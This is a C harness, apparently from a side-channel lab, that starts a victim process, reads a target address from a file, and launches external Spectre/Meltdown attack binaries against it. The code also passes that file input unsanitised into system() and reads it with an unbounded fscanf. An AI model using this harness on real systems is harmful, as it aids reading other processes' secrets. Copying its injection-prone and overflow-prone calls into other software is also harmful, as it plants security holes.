#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

#define BUFFER_SIZE 128

void run_victim(pid_t *victim_pid) {
    pid_t pid;

    // Forking a new process
    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid == 0) {
        // Child process
        execl("./victim", "./victim", (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {
        // Parent process
        *victim_pid = pid;
    }
}

void run_spectre(char *memory_address, int length, int cache_hit_threshold) {
    char command[256];
    snprintf(command, sizeof(command), "./spectre_with_argument %s %d %d", memory_address, length, cache_hit_threshold);
    system(command);
}

void run_meltdown(char *memory_address, int length, int cache_hit_threshold) {
    char command[256];
    snprintf(command, sizeof(command), "./meltdown_with_argument %s %d %d", memory_address, length, cache_hit_threshold);
    system(command);
}

int main() {
    pid_t victim_pid;
    char secret_address[BUFFER_SIZE];
    int length = 20;  // will read Length of data
    int cache_hit_threshold = 80;

    // Run process for victim
    run_victim(&victim_pid);

    // Wait a little bit 
    sleep(1);

    // Read the secret address from file
    FILE *f = fopen("secret_address.txt", "r");
    if (f == NULL) {
        perror("fopen");
        return 1;
    }
    fscanf(f, "%s", secret_address);
    fclose(f);

    // Ensure secret_address is correctly captured
    printf("Captured secret address: %s\n", secret_address);

    // Run spectre attack with the captured address
    run_spectre(secret_address, length, cache_hit_threshold);

    // Terminate the victim process
    kill(victim_pid, SIGKILL);
    waitpid(victim_pid, NULL, 0);

    return 0;
}
